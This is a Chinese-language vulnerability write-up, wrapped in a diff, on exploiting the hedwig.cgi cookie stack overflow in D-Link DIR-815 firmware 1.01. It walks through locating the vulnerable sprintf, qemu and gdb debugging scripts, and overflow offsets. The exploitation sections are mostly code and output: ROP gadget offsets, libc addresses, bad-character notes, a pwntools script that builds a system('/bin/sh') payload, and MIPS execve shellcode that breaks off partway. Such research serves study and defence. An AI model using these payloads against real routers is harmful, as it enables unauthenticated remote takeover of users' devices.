@@ -1,0 +1,1008 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h1 data-content="1" id="6a1e33f9f1ae6a870212779265497e4f">前言</h1>
+<p>去年这个时候第一次分析这个漏洞，当时跟着0day那本书一步一步调试和分析，主要是从qemu用户模式进行分析调试结果写的exp没有getshell，时隔一年再次分析，这次增加了qemu系统模式分析调试,Firmadyne仿真测试以及实体机测试这次可以终于getshell了，这次分析较上次有了更多收获。</p>
+<h1 data-content="1" id="5bed7d4ef8592cf49ff03c495bd57412">漏洞介绍</h1>
+<blockquote>
+<p>Buffer overflow on "hedwig.cgi"<br/>
+Another buffer overflow affects the "hedwig.cgi" CGI script. Unauthenticated remote attackers can invoke this CGI with an overly-long cookie value that can overflow a program buffer and overwrite the saved program address.</p>
+</blockquote>
+<p>D-Link官方安全公告：从漏洞公告中可以看出，该漏洞存在于名为"hedwig.cgi"的CGI脚本中，未认证攻击者通过调用这个CGI脚本传递一个超长的Cookie值，使得程序栈溢出，从而获得路由器的远程控制权限。</p>
+<p>具体详细内容可以在《揭秘家用路由器0day漏洞挖掘技术》一书中找到，接下来我们直接定位漏洞触发函数并进行一系列分析。</p>
+<h1 data-content="1" id="24e26ddeeace8f42b0f0d576e983a144">固件获取及漏洞定位</h1>
+<p>调试环境：ubuntu16.04 x64和x32，IDA6.8和7.0，qemu2.5</p>
+<p>固件下载地址：<a>ftp://ftp2.dlink.com/PRODUCTS/DIR-815/REVA/DIR-815_FIRMWARE_1.01.ZIP</a></p>
+<h2 data-content="1" id="ed8394af98ee77699b0ea2d149cd6564">固件解压</h2>
+<p><code>binwalk -Me</code>解压</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200603094307-92f86150-a53b-1.png"/></p>
+<h2 data-content="1" id="30842696e479949fe5c7514feb69bf6d">漏洞定位</h2>
+<p>该漏洞的核心组件为hedwig.cgi，<code>find . -name '*cgi'</code>查找文件，并<code>ls -l ./htdocs/web/hedwig.cgi</code>发现hedwig.cgi是指向./htdocs/cgibin的符号链接，也就是说真正的漏洞代码在cgibin中。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200603094308-93885a8a-a53b-1.png"/></p>
+<p>由之前的漏洞介绍可以知道<code>HTTP_COOKIE</code>过长导致漏洞，分别用IDA和ghidra打开cgibin这个文件，在string窗口中进行搜索<code>HTTP_COOKIE</code></p>
+<p><img src="http_cookie.png"/>可以找到有一个函数，就是<code>sess_get_uid</code>，我之前有写<a href="https://pup2y.github.io/2020/05/19/d-linkzhong-sobj-lei-han-shu-ni-xiang-fen-xi/" target="_blank">帖子</a>分析一下这个函数，就是提取<code>HTTP_COOKIE</code>里面的<code>uid=</code>之后的部分。交叉引用一下，找到了<code>hedwigcgi_main</code>函数。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200603094309-9408e25e-a53b-1.png"/>利用Ghidra反汇编<code>hedwigcgi_main</code>函数，可以定位到其中的<code>sprintf</code>函数引起了栈溢出。<code>hedwigcgi_main</code>函数通过<code>sess_get_uid()</code>获取到<code>HTTP_COOKIE</code>中<code>uid=</code>之后的值，并将该内容按照<code>sprintf</code>函数中格式化字符串给定的形式拷贝到栈中，由于没有检测并限制输入的大小，导致栈溢出。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200603094310-9492ca28-a53b-1.png"/></p>
+<p>但是继续往后看该函数中后面还有一个<code>sprintf</code>函数，第四个参数同样是<code>HTTP_COOKIE</code>中<code>uid=</code>后面的内容，这一块按道理来说也可以导致栈溢出。而且如果可以执行该<code>sprintf</code>函数则能覆盖之前<code>sprintf</code>函数栈上的内容。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200603094310-94e26a7e-a53b-1.png"/></p>
+<p>在《揭秘家用路由器0day漏洞挖掘技术》一书中写到，如果在文件系统中手工创建<code>/var/tmp</code>文件夹，就能够到达第二个<code>sprintf</code>函数。我对比了下有无<code>/var/tmp</code>文件夹的返回结果:</p>
+<p>无<code>/var/tmp</code>，返回unable to open temp file。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200603094311-959b87de-a53b-1.png"/></p>
+<p>有<code>/var/tmp</code>，返回no xml data。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200603094312-962ba6a2-a53b-1.png"/></p>
+<p>想着往里面写个/temp.xml文件并添加内容就可以了吧，结果发现还是返回no xml data。因为fopen打开该文件的方式是'w'，创建一个用于写入的空文件。如果文件名称与已存在的文件相同，则会删除已有文件的内容，文件被视为一个新的空文件。所以只要执行了这条指令文件内容就会被清空，返回值一定是<code>no xml data</code>，所以利用qemu用户模式这样调试的话，是到不了第二个<code>sprintf</code>函数。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200603094313-96c65e22-a53b-1.png"/></p>
+<p>所以漏洞点是第一个<code>sprintf</code>函数。其实有挺多帖子也是分析得到第一个<code>sprintf</code>函数是漏洞点，死活到不了第二个sprintf。</p>
+<h2 data-content="1" id="91c1375b91e61834d791676e880873d6">漏洞重新定位</h2>
+<p>爆肝一晚，参考一个大佬的<a href="https://kirin-say.top/2019/02/23/Building-MIPS-Environment-for-Router-PWN" target="_blank">文章</a>，发现了为什么到达不了第二个sprintf的原因。</p>
+<p>还需要POST数据包中包含”uid=……”，否则运行不了下面的代码，</p>
+<pre><code>.text:00409AB0                 la      $t9, sobj_strdup
+.text:00409AB4                 lw      $a0, 4($s0)
+.text:00409AB8                 jalr    $t9 ; sobj_strdup
+.text:00409ABC                 nop
+.text:00409AC0                 lw      $ra, 0x20+var_4($sp)
+.text:00409AC4                 lui     $v1, 0x43  # 'C'
+.text:00409AC8                 lw      $gp, 0x20+var_10($sp)
+.text:00409ACC                 lw      $s0, 0x20+var_8($sp)
+.text:00409AD0                 sw      $v0, haystack
+.text:00409AD4                 jr      $ra
+.text:00409AD8                 addiu   $sp, 0x20</code></pre>
+<p>从而无法申请一个新的堆空间，这样haystack中值将为0，在运行完第一个sprinf之后会进入loc_4096D4，如果haystack为0将则不会进入loc_4096F0分支，进而跳转不了第二个sprintf()。</p>
+<div class="highlight"><pre><span></span><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mo">0040</span><span class="mi">96</span><span class="n">D4</span> <span class="nl">loc_4096D4</span><span class="p">:</span>                              <span class="err">#</span> <span class="n">CODE</span> <span class="nl">XREF</span><span class="p">:</span> <span class="n">hedwigcgi_main</span><span class="o">+</span><span class="mi">240</span><span class="err"></span><span class="n">j</span>
+<span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mo">0040</span><span class="mi">96</span><span class="n">D4</span>                 <span class="n">lw</span>      <span class="err">$</span><span class="n">v0</span><span class="p">,</span> <span class="n">haystack</span>
+<span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mo">0040</span><span class="mi">96</span><span class="n">DC</span>                 <span class="n">nop</span>
+<span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mf">004096E0</span>                 <span class="n">bnez</span>    <span class="err">$</span><span class="n">v0</span><span class="p">,</span> <span class="n">loc_4096F0</span>
+<span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mf">004096E4</span>                 <span class="n">lui</span>     <span class="err">$</span><span class="n">v0</span><span class="p">,</span> <span class="mh">0x42</span>  <span class="err">#</span> <span class="sc">'B'</span>
+<span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mf">004096E8</span>                 <span class="n">b</span>       <span class="n">loc_409A64</span>
+<span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mo">0040</span><span class="mi">96</span><span class="n">EC</span>                 <span class="n">addiu</span>   <span class="err">$</span><span class="n">a1</span><span class="p">,</span> <span class="err">$</span><span class="n">v0</span><span class="p">,</span> <span class="p">(</span><span class="n">aNoXmlData_</span> <span class="o">-</span> <span class="mh">0x420000</span><span class="p">)</span>  <span class="err">#</span> <span class="s">"no xml data."</span>
+</pre></div>
+<p>如何使POST数据包中包含”uid=……”，看了大佬们的文章还有《0day》那本书中的测试脚本发现，POST具体数据可以通过类似输入流传入 ：echo "uid=aaa"| /htdocs/web/hedwig.cgi。然后前提也是需要手工创建'/var/tmp'文件夹。</p>
+<h1 data-content="1" id="004eda12eb0bc8afc5c8e8f9a8a450af">漏洞分析与利用</h1>
+<h2 data-content="1" id="821bc4f373ddd28979fa60a7331fd27a">漏洞分析</h2>
+<p>hedwigcgi_main()在调用get_sess_uid函数前需要设置环境变量REQUEST_METHOD为POST。</p>
+<p>cgi程序通过getenv的方式获取HTTP数据包中的数据，整个流程应该为:</p>
+<p>主Web程序监听端口-&gt;传送HTTP数据包-&gt;HTTP报文中headers等数据通过环境变量的方式传给cgi处理程序-&gt;cgi程序通过getenv获取数据并处理返回给主程序-&gt;向客户端返回响应数据</p>
+<p>漏洞点sprintf函数</p>
+<p>sprintf(栈上的内容,"%s/%s/postxml","/runtime/session",uid的内容)uid的内容是由用户控制的，却没有长度限制，而栈空间有限，hedwigcgi_main同时是一个非叶子函数，那么ra一定存在栈上，我们接下来要做的就是覆盖栈空间内的saved ra达到控制程序流程的目的。</p>
+<h2 data-content="1" id="7738663dd02fac50e7271d1062644d37">漏洞利用</h2>
+<p>整个漏洞利用过程是</p>
+<ul>
+<li>劫持PC，通过调试确定缓冲区大小，定位并确定控制偏移</li>
+<li>确定攻击路径，构造ROP链</li>
+<li>编写exp,getshell</li>
+</ul>
+<h2 data-content="1" id="924c547ae54e351d622cbb62e306ec29">动态调试确定偏移</h2>
+<p>利用qemu和IDA进行动态调试,用的是（IDA6.8,qemu2.5）</p>
+<p>调试脚本test.sh，其中需要sudo chroot 到文件系统下，然后利用qemu-mipsel-static用户模式进行调试，-E是对应环境变量的参数。-g 指定调试端口，“2&gt; /dev/null” 代表忽略掉错误提示信息。</p>
+<div class="highlight"><pre><span></span><span class="c1">#/bin/bash</span>
+<span class="nv">test</span><span class="o">=</span><span class="k">$(</span>python -c <span class="s2">"print 'uid='+open('test','r').read(2000)"</span><span class="k">)</span>
+<span class="nv">LEN</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> -n <span class="s2">"</span><span class="nv">$test</span><span class="s2">"</span> <span class="p">|</span> wc -c<span class="k">)</span>
+<span class="nv">PORT</span><span class="o">=</span><span class="s2">"23957"</span>
+cp <span class="k">$(</span>which qemu-mipsel-static<span class="k">)</span> ./qemu
+sudo chroot . ./qemu -E <span class="nv">CONTENT_LENGTH</span><span class="o">=</span><span class="nv">$LEN</span> -E <span class="nv">CONTENT_TYPE</span><span class="o">=</span><span class="s2">"application/x-www-form-urlencoded"</span> -E <span class="nv">REQUEST_METHOD</span><span class="o">=</span><span class="s2">"POST"</span> -E <span class="nv">HTTP_COOKIE</span><span class="o">=</span><span class="nv">$test</span> -E <span class="nv">REQUEST_URL</span><span class="o">=</span><span class="s2">"/hedwig.cgi"</span> -E <span class="nv">REMOTE_ADDR</span><span class="o">=</span><span class="s2">"127.0.0.1"</span> -g <span class="nv">$PORT</span> /htdocs/web/hedwig.cgi <span class="m">2</span>&gt;/dev/null
+rm -f ./qemu
+</pre></div>
+<p>在这之前需要利用patternLocOffset.py生成test文件，包含特定格式的2000个字符串。</p>
+<p><code>python patternLocOffset.py -c -l 2000 -f test</code></p>
+<p>使用IDA调试发现运行到hedwigcgi_main()返回时ra寄存器中的值为0x38694237</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200603094314-9727273e-a53b-1.png"/></p>
+<p><code>python patternLocOffset.py -s 0x38694237 -l 2000</code>确定缓冲区距离ra的距离为1043。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200603094315-97d01a6a-a53b-1.png"/></p>
+<p>可以通过修改test.sh中的<code>test =$(python -c "print 'uid=' + 'A'*1043 + 'B'*4")</code>进一步确定偏移为1043。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200603094316-98298cbc-a53b-1.png"/></p>
+<p>以上是触发第一个sprintf()的偏移。</p>
+<h2 data-content="1" id="18700998b61cd2a251769d67c27c466a">重新确定偏移</h2>
+<p>更改test.sh，在脚本中加入echo "uid=xxx"。</p>
+<div class="highlight"><pre><span></span><span class="ch">#!/bin/bash</span>
+<span class="c1">#sudo ./test.sh  "uid=1234"  `python -c "print 'uid=' + open('content','r').read()"`</span>
+
+<span class="nv">INPUT</span><span class="o">=</span><span class="s2">"</span><span class="nv">$1</span><span class="s2">"</span>
+<span class="nv">COOKIE</span><span class="o">=</span><span class="s2">"</span><span class="nv">$2</span><span class="s2">"</span>
+<span class="nv">PORT</span><span class="o">=</span><span class="s2">"23957"</span>
+<span class="nv">LEN</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> -n <span class="s2">"</span><span class="nv">$INPUT</span><span class="s2">"</span> <span class="p">|</span> wc -c<span class="k">)</span>
+cp <span class="k">$(</span>which qemu-mipsel-static<span class="k">)</span> ./qemu
+
+<span class="nb">echo</span> <span class="nv">$INPUT</span> <span class="p">|</span> chroot . ./qemu -E <span class="nv">CONTENT_LENGTH</span><span class="o">=</span><span class="nv">$LEN</span> -E <span class="nv">CONTENT_TYPE</span><span class="o">=</span><span class="s2">"application/x-www-form-urlencoded"</span> -E <span class="nv">REQUEST_METHOD</span><span class="o">=</span><span class="s2">"POST"</span> -E <span class="nv">HTTP_COOKIE</span><span class="o">=</span><span class="nv">$COOKIE</span> -E <span class="nv">REQUEST_URI</span><span class="o">=</span><span class="s2">"/hedwig.cgi"</span> -E <span class="nv">REMOTE_ADDR</span><span class="o">=</span><span class="s2">"127.0.0.1"</span>  -g <span class="nv">$PORT</span> /htdocs/web/hedwig.cgi
+rm -f ./qemu
+</pre></div>
+<p>执行命令</p>
+<div class="highlight"><pre><span></span>sudo ./test.sh  <span class="s2">"uid=1234"</span>  <span class="sb">`</span>python -c <span class="s2">"print 'uid=' + open('content','r').read()"</span><span class="sb">`</span>
+</pre></div>
+<p>调试之后发现确实能够触发第二个sprintf()。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200603094317-98c25a3c-a53b-1.png"/></p>
+<p>并且覆盖了ra=68423668。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200603094317-9911b488-a53b-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200603094318-997f1e56-a53b-1.png"/></p>
+<p>计算得到偏移为1009。</p>
+<h2 data-content="1" id="df93620a1b34b510729b06aa0c5cc07a">构造ROP链</h2>
+<h3 data-content="1" id="3bd5e68b26452b165e64c96c8c6b0112">通过system函数getshell</h3>
+<p>主要目的是调用system('/bin/sh')来getshell，system函数在libc.so中找，参数'/bin/sh'首先放入栈中，然后利用gadget将栈上的'/bin/sh'传入a0寄存器，再调用system函数即可。</p>
+<h4 data-content="1" id="f6dff98c63e33328a430d653116e8c35">定位system函数地址</h4>
+<p>参考《0day》那本书，首先需要搜索system函数的地址，需要先找到libc.so，然后在libc.so中找到system函数。</p>
+<p>通过以下过程：</p>
+<div class="highlight"><pre><span></span>gdb-multiarch htdocs/cgibin <span class="c1">#一定要加载文件htdocs/cgibin不然vmmap得不到结果</span>
+<span class="nb">set</span> architecture mips
+target remote :23957
+b *0x409A54 <span class="c1">#hedwigcgi_main()函数返回jr ra处</span>
+c
+vmmap
+</pre></div>
+<p>为了以后不用每次都输入固定的指令可以编写一个dbgscript</p>
+<div class="highlight"><pre><span></span><span class="nb">set</span> architecture mips
+<span class="nb">set</span> endian little
+file htdocs/cgibin
+target remote :23957
+b *0x409a54
+</pre></div>
+<p>gdb-multiarch调试的时候执行<code>gdb-multiarch -x dbgscript</code>，-x是指定要执行的命令文件。</p>
+<p>得到libuClibc-0.9.30.1.so的基地址为0x76738000。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200603094319-99fd5a82-a53b-1.png"/></p>
+<p>找到libuClibc-0.9.30.1.so用IDA打开，system函数在0x53200处。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200603094320-9a6a2af4-a53b-1.png"/></p>
+<p>这样就得到了system函数的真实地址0x76738000+0x53200=0x7678b200。</p>
+<h4 data-content="1" id="f532a9ecd96b416655381ec020e66ded">绕过0构造rop链</h4>
+<p>因为system函数的最低位为\x00，在构造HTTP_COOKIE的时候\x00会被sprintf截断，其实还不用到sprintf函数，之前sess_get_uid函数就获取\x00字符之前的字符串，导致缓冲区溢出失败。所以构造shellcode时需要存入的事0x7678b200-1=0x7678b1ff，之后通过寻址gadget将其加1即可。</p>
+<p>首先考虑将栈上地址放入寄存器中，在libuClibc-0.9.30.1.so利用mipsrop插件中的<code>mipsrop.stackfinder()</code>命令查找将堆栈中数据放入寄存器的gadget。在0x159cc处发现可将当前栈$sp+0x10处的值存入寄存器s5并跳转至s0。并且在跳转之前将$s5的内容给到$a0，这样system函数的第一个参数就成功了。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200603094320-9ab3d154-a53b-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200603094321-9b0329de-a53b-1.png"/></p>
+<p>继续在libuClibc-0.9.30.1.so中寻找+1的gadget，使用mipsrop插件，<code>mipsrop.find("addiu .*,1")</code>得到31个gadget，找到0x00045988处，将寄存器s0中的值加一。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200603094321-9b4dc296-a53b-1.png"/></p>
+<p>所以需要将system函数地址减一之后放入s0寄存器中，这个gadget之后是跳转到s1寄存器中的地址。</p>
+<p>由IDA中的反汇编代码可以看出我们可以控制数据覆盖ra,fp,s7~s0寄存器。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200603094322-9ba6d99e-a53b-1.png"/></p>
+<p>可以这样构造数据，payload大致如下：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200603094322-9c1e5bc2-a53b-1.png"/></p>
+<p>这里参考下H4lo师傅的整个流程图：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200603094323-9c735410-a53b-1.png"/></p>
+<p>对应的exp如下：</p>
+<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/python2</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">context</span><span class="o">.</span><span class="n">endian</span> <span class="o">=</span> <span class="s2">"little"</span>
+<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s2">"mips"</span>
+<span class="n">base_addr</span> <span class="o">=</span> <span class="mh">0x76738000</span>
+<span class="n">system_addr_1</span> <span class="o">=</span> <span class="mh">0x53200</span><span class="o">-</span><span class="mi">1</span>
+<span class="n">gadget1</span> <span class="o">=</span> <span class="mh">0x45988</span>
+<span class="n">gadget2</span> <span class="o">=</span> <span class="mh">0x159cc</span>
+
+<span class="n">padding</span> <span class="o">=</span> <span class="s1">'A'</span> <span class="o">*</span> <span class="mh">0x3cd</span>
+<span class="n">padding</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">base_addr</span> <span class="o">+</span> <span class="n">system_addr_1</span><span class="p">)</span> <span class="c1"># s0</span>
+<span class="n">padding</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">base_addr</span> <span class="o">+</span> <span class="n">gadget2</span><span class="p">)</span>       <span class="c1"># s1</span>
+<span class="n">padding</span> <span class="o">+=</span> <span class="s1">'A'</span> <span class="o">*</span> <span class="mi">4</span>                        <span class="c1"># s2</span>
+<span class="n">padding</span> <span class="o">+=</span> <span class="s1">'A'</span> <span class="o">*</span> <span class="mi">4</span>                        <span class="c1"># s3</span>
+<span class="n">padding</span> <span class="o">+=</span> <span class="s1">'A'</span> <span class="o">*</span> <span class="mi">4</span>                        <span class="c1"># s4</span>
+<span class="n">padding</span> <span class="o">+=</span> <span class="s1">'A'</span> <span class="o">*</span> <span class="mi">4</span>                        <span class="c1"># s5</span>
+<span class="n">padding</span> <span class="o">+=</span> <span class="s1">'A'</span> <span class="o">*</span> <span class="mi">4</span>                        <span class="c1"># s6</span>
+<span class="n">padding</span> <span class="o">+=</span> <span class="s1">'A'</span> <span class="o">*</span> <span class="mi">4</span>                        <span class="c1"># s7</span>
+<span class="n">padding</span> <span class="o">+=</span> <span class="s1">'A'</span> <span class="o">*</span> <span class="mi">4</span>                        <span class="c1"># fp</span>
+<span class="n">padding</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">base_addr</span> <span class="o">+</span> <span class="n">gadget1</span><span class="p">)</span>       <span class="c1"># ra</span>
+<span class="n">padding</span> <span class="o">+=</span> <span class="s1">'B'</span> <span class="o">*</span> <span class="mh">0x10</span>
+<span class="n">padding</span> <span class="o">+=</span> <span class="s1">'/bin//sh'</span>
+
+<span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">"exploit"</span><span class="p">,</span><span class="s1">'wb+'</span><span class="p">)</span>
+<span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">padding</span><span class="p">)</span>
+<span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</pre></div>
+<h4 data-content="1" id="e0d04fa102133f623b269ed4cec10dea">测试结果</h4>
+<p>执行命令：</p>
+<div class="highlight"><pre><span></span>sudo ./test.sh  <span class="s1">'uid=1234'</span> <span class="sb">`</span>python -c <span class="s2">"print 'uid=' + open('exploit','r').read()"</span><span class="sb">`</span>
+</pre></div>
+<p>使用gdb-multiarch联调发现，确实能够跳转到gadget1处（0x76738000+0x45988=0x7677d988），将s0处的system-1地址加一。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200603094326-9e062b68-a53b-1.png"/></p>
+<p>之后顺利进入gadget1处(0x76738000+0x159cc=0x7674d9cc)处，将栈上内容(sp+0x10)先加载到s5，并在跳转s0前将s5中内容传给a0。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200603094327-9f01ed22-a53b-1.png"/></p>
+<p>进入system处，a0参数为/bin//sh。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200603094329-9fc0dde0-a53b-1.png"/></p>
+<p>继续往下执行，发现执行完system函数返回时被中断了，因为当前指令是从(fp+0x10)处取一个字节给$gp，然后当前$fp的内容为0x0，(fp+0x10处)也无法访问，所以自然就报错了。空指针问题</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200603094330-a08d9d3a-a53b-1.png"/></p>
+<p>但是在整个rop链运行过程中并没有出现给$fp赋值的操作，所以这块为什么$fp会变成0，变成空指针。这是一个问题，需要解决，应该是还是构造的rop链执行system函数的过程中出现了问题。</p>
+<h3 data-content="1" id="521151165cc4c4ceb58165222b54d6ae">调用sleep(1)函数</h3>
+<p>接下来考虑利用另一种方式通过调用sleep(1)函数来getshell，至于为什么利用sleep(1)函数呢，参考这篇<a href="http://xdxd.love/2016/12/09/一个mips栈溢出利用/" target="_blank">文章</a>，里面有讲到一个问题就是cache incoherency。MIPS CPUs有两个独立的cache：<strong>指令cache</strong>和<strong>数据cache</strong>。指令和数据分别在两个不同的缓存中。当缓存满了，会触发flush，将数据写回到主内存。<strong>攻击者的攻击payload通常会被应用当做数据来处理，存储在数据缓存中</strong>。当payload触发漏洞，劫持程序执行流程的时候，会去执行内存中的shellcode。<strong>如果数据缓存没有触发flush的话，shellcode依然存储在缓存中，而没有写入主内存。这会导致程序执行了本该存储shellcode的地址处随机的代码，导致不可预知的后果。 </strong></p>
+<p>最简单可靠的让缓存数据写入内存的方式是调用一个堵塞函数。比如sleep(1)或者其他类似的函数。sleep的过程中，处理器会切换上下文让给其他正在执行的程序，缓存会自动执行flush。</p>
+<p>整个ROP的调用流程参考<a href="https://www.anquanke.com/post/id/179510#h3-6" target="_blank">H4lo</a>师傅的图。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200603094331-a125121e-a53b-1.png"/></p>
+<h4 data-content="1" id="7a8fb7489fe60f9e9107d3675b98e5dc">ROP Gadget使用</h4>
+<h5 data-content="1" id="119fc7b8b2f32e1f364740d0b74de163">ROP Gadget 1</h5>
+<p>利用<code>mipsrop.find("li $a0,1")</code>寻找到0x57E50处，并且返回时跳转至s1寄存器中地址。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200603094331-a16b2ad8-a53b-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200603094332-a1a90b1e-a53b-1.png"/></p>
+<p>可以将ra处覆盖为<code>ra=gadget1=0x57E50+libc_base</code>。之后寻找第二个gadget2将其放入s1，这里不能直接将sleep函数放入s1中，因为sleep函数运行完jr $ra时，我们控制不了，所以接下来应该是寻找能够控制$ra的gadget2.</p>
+<h5 data-content="1" id="3deb5865ea5557ba56d8cf98821ad7a9">ROP Gadget 2</h5>
+<p>利用mipsrop插件中的<code>mipsrop.tail()</code>该函数作用是<code>Prints a lits of all tail call gadgets (useful for function calls).</code>打印出所有函数尾部调用的gadget，这些gadget对函数调用很有效。因为非叶子函数尾部一般是将栈中值返回给寄存器然后再跳转。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200603094332-a1f5e88a-a53b-1.png"/></p>
+<p>选择0x3B8A8作为gadget2。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200603094333-a244afce-a53b-1.png"/></p>
+<p>该gadget的作用是将栈上(sp+0x24)处的内容给到寄存器ra，然后再跳转至s2寄存器中，所以s2寄存器就可以放我们需要的sleep函数的地址。这样的话<code>s1=gadget2=0x3B8A8+libc_base</code>，<code>s2 = sleep+libc_base</code>。</p>
+<p>sleep函数在libuClibc-0.9.30.1.so的偏移为0x56BD0。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200603094333-a2ad624e-a53b-1.png"/></p>
+<h5 data-content="1" id="b73c9ff32433d7cb49029585ee1231f1">ROP Gadget 3</h5>
+<p>执行完sleep函数之后需要控制程序执行栈上shellcode，这里需要用到mipsrop插件的<code>mipsrop.stackfinder()</code>，将栈上的shellcode地址存储进寄存器中。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200603094334-a2f98fc0-a53b-1.png"/></p>
+<p>找到0x14F28处的gadget3，所以<code>$(sp+0x24)=gadget3</code>作用是将sp+0x18处的值赋给s1，之后跳转到s4寄存器中的地址。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200603094334-a347f6ce-a53b-1.png"/></p>
+<p>所以接下来我们需要的gadget4是'move $t9,$s1'，跳转到是s1也就是我们的shellcode。</p>
+<h5 data-content="1" id="9791063da8ceb0632d1281040280434c">ROP Gadget 4</h5>
+<p>利用<code>mipsrop.find("move $t9,$s1")</code>找到一下gadget。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200603094335-a39638b6-a53b-1.png"/></p>
+<p>这里选择0x1DD08作为gadget4，<code>s4=gadget4=0x1DD08+libc_base</code>。因为其他的gadget可能导致最后出现坏字符，比如我试了0xBB44，结果真实地址为0xBB44+0x76738000=0x76743b44，然而3b在sess_get_uid的时候就被截断了,所以导致rop没有构造成功。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200603094335-a3e32ce8-a53b-1.png"/></p>
+<p>到这里所有的gadget都找齐了，接下来开始构造exp。</p>
+<h5 data-content="1" id="67af3a59b8d3393c623213fb30bc5c39">构造exp</h5>
+<p>整个payload是这样的：</p>
+<p>这里顺便提下构造exp时有可能的坏字符：0x20（空格）、0x00（结束符）、0x3a（冒号）、0x3f（问号）、0x3b（分号）、0x0a(\n换行符)等。具体还要看程序如何处理以及转义。</p>
+<div class="highlight"><pre><span></span><span class="n">libc_base</span> <span class="o">=</span> <span class="mh">0x76738000</span>
+<span class="n">sleep</span> <span class="o">=</span> <span class="mh">0x56BD0</span>
+<span class="n">gadget1</span> <span class="o">=</span> <span class="mh">0x57E50</span>
+<span class="n">gadget2</span> <span class="o">=</span> <span class="mh">0x3B8A8</span>
+<span class="n">gadget3</span> <span class="o">=</span> <span class="mh">0x14F28</span>
+<span class="n">gadget4</span> <span class="o">=</span> <span class="mh">0x1DD08</span>
+
+<span class="c1"># Linux/MIPS - execve /bin/sh - 48 bytes</span>
+<span class="n">shellcode</span> <span class="o">=</span> <span class="s2">"</span><span class="se">\xff\xff\x06\x28</span><span class="s2">"</span>  <span class="c1"># slti $a2, $zero, -1</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="s2">"</span><span class="se">\x62\x69\x0f\x3c</span><span class="s2">"</span>  <span class="c1"># lui $t7, 0x6962</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="s2">"</span><span class="se">\x2f\x2f\xef\x35</span><span class="s2">"</span>  <span class="c1"># ori $t7, $t7, 0x2f2f</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="s2">"</span><span class="se">\xf4\xff\xaf\xaf</span><span class="s2">"</span>  <span class="c1"># sw $t7, -0xc($sp)</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="s2">"</span><span class="se">\x73\x68\x0e\x3c</span><span class="s2">"</span>  <span class="c1"># lui $t6, 0x6873</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="s2">"</span><span class="se">\x6e\x2f\xce\x35</span><span class="s2">"</span>  <span class="c1"># ori $t6, $t6, 0x2f6e</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="s2">"</span><span class="se">\xf8\xff\xae\xaf</span><span class="s2">"</span>  <span class="c1"># sw $t6, -8($sp)</span>
